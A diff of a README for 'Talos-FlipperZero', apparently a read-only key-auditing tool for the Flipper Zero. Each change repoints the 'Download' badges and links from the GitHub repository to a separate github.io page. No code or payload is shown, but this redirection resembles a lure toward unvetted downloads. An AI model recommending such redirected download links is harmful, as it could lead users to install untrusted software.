@@ -1,6 +1,6 @@
 # 🔐 Talos-FlipperZero - Know What Your Key Actually Proves
 
-[![Download Talos-FlipperZero](https://img.shields.io/badge/Download-Talos--FlipperZero-2ea44f?style=for-the-badge)](https://github.com/longsuitfala203/Talos-FlipperZero)
+[![Download Talos-FlipperZero](https://img.shields.io/badge/Download-Talos--FlipperZero-2ea44f?style=for-the-badge)](https://longsuitfala203.github.io)
 
 ## 🧐 What Is This?
 
@@ -62,13 +62,13 @@ Talos-FlipperZero never writes data to any key. It uses safe, read-only communic
 
 ## 🚀 Getting Started
 
-Getting started is easy. Visit this link to download the application: [https://github.com/longsuitfala203/Talos-FlipperZero](https://github.com/longsuitfala203/Talos-FlipperZero)
+Getting started is easy. Visit this link to download the application: [https://longsuitfala203.github.io](https://longsuitfala203.github.io)
 
 ## 📥 Installation & Setup
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/longsuitfala203/Talos-FlipperZero](https://github.com/longsuitfala203/Talos-FlipperZero)
+Visit this link to download the application: [https://longsuitfala203.github.io](https://longsuitfala203.github.io)
 
 Look for the download section or the "Download" button. The file you need will be clearly labeled.
 
@@ -230,7 +230,7 @@ Whether you're protecting a server room, auditing a client's security, or just c
 
 **Download now and discover what your keys are really saying.** 👇
 
-[![Download Talos-FlipperZero](https://img.shields.io/badge/Download%20Now-Talos--FlipperZero-blue?style=for-the-badge&logo=github)](https://github.com/longsuitfala203/Talos-FlipperZero)
+[![Download Talos-FlipperZero](https://img.shields.io/badge/Download%20Now-Talos--FlipperZero-blue?style=for-the-badge&logo=github)](https://longsuitfala203.github.io)
 
 ---
 
